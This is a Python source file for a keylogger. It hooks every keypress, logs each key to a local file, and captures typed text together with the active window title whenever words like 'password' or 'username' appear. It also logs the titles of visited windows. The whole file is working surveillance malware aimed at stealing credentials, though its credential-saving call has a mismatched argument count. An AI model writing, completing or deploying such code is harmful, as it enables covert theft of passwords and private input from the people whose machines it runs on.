import keyboard
import time
import pygetwindow as GetWindow
from datetime import datetime

def get_active_window():
    active_window = GetWindow.getActiveWindow()
    if active_window:
        return active_window.title
    else:
        return None
    
def save_info(website, login_info, DateTime):
    Data_and_Time = datetime.now().strftime("%Y- %m-%d %H:%M:%S")
    with open("KeyTracker.txt", "a") as f:
        f.write(f"Website: {website}\n")
        f.write(f"Login Info: {login_info}\n\n")
        f.write(f"Date & Time: {DateTime}\n\n")

def Keylogger():
    Tracker = []
    
    
    def on_key(event):
        key = event.name
        with open("KeyTracker.txt", "a") as f:
            f.write(f"Pressed key: {key}\n")
        if len(key) == 1:
            Tracker.append(key)
        elif key == 'space':
            Tracker.append(' ')
        elif key == 'enter':
            Tracker.append('\n')
        elif key == 'backspace':
            if Tracker:
                Tracker.pop()
            
        if any(keyword in ''.join(Tracker).lower() for keyword in ['login', 'password', 'email', 'username']):
            website = get_active_window()
            login_info = ''.join(Tracker).replace('\n', '')
            save_info(website, login_info)
            Tracker.clear()
            
    keyboard.on_press(on_key)
    
    
            
if __name__ == '__main__':
    Keylogger()
    visited_sites = set()
    while True:
        time.sleep(1)
        active_window = get_active_window()
        if active_window and active_window != 'KeyTracker.txt' and active_window not in visited_sites:
            visited_sites.add(active_window)
            with open ("Visited_Sites.txt", "a") as f:
                f.write(f"{datetime.now().strftime('%Y- %m-%d %H:%M:%S')} - {active_window}\n")